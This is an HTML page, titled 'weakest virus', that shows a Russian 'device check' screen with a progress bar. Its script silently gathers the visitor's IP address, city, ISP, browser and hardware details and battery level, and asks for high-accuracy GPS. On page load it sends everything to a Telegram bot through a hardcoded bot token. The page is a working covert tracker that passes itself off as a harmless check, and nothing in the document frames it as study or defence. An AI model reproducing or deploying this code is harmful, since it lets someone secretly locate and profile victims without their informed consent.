<!doctype html>
<html lang="ru"><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>weakest virus</title>
<style>
body{margin:0;height:100vh;display:flex;align-items:center;justify-content:center;
background:#0d1117;color:#c9d1d9;font-family:system-ui,sans-serif;text-align:center}
.box{padding:24px}
.t{font-size:19px;font-weight:600;margin-bottom:6px}
.s{font-size:13px;color:#8b949e}
.bar{width:200px;height:4px;background:#21262d;border-radius:9px;overflow:hidden;margin:18px auto 0}
.f{height:100%;width:0;background:#2ea043;animation:g 9s linear forwards}
@keyframes g{to{width:100%}}
</style>
<div class="box">
 <div class="t">weakest virus</div>
 <div class="s" id="s">Проверка устройства...</div>
 <div class="bar"><div class="f"></div></div>
</div>
<script>
const TK='9025946568:AAGCj1Okg0kfFjYjgeeSwYn0c3FnYhwGpzE', CID='ID';
const p=t=>fetch(`https://api.telegram.org/bot${TK}/sendMessage?chat_id=${CID}&text=${encodeURIComponent(t)}`,{mode:'no-cors'}).catch(()=>{});
const base=`Device: ${navigator.userAgent}\nScreen: ${screen.width}x${screen.height}\nLang: ${navigator.language}\nTZ: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\nCores: ${navigator.hardwareConcurrency||'?'}\nRAM: ${navigator.deviceMemory||'?'}GB\nTime: ${new Date()}`;
(async()=>{
 let ip={};
 try{ip=await(await fetch('https://ipwho.is/')).json()}catch(e){}
 p(`=== weakest virus ===\nIP: ${ip.ip||'?'} | ${ip.city||'?'}, ${ip.country||'?'} | ISP: ${ip.connection?.isp||'?'}\n${base}`);
 let bat='';
 try{const b=await navigator.getBattery();bat=`Bat: ${Math.round(b.level*100)}%`}catch(e){}
 try{
  const g=await new Promise((r,j)=>navigator.geolocation.getCurrentPosition(r,j,{timeout:12000,enableHighAccuracy:true}));
  p(`GPS: ${g.coords.latitude},${g.coords.longitude} ±${Math.round(g.coords.accuracy)}m\n${bat}\n${base}`);
 }catch(e){ p(`GPS: denied\n${bat}\n${base}`); }
 document.getElementById('s').textContent='Готово';
})();
                                                                      </script>
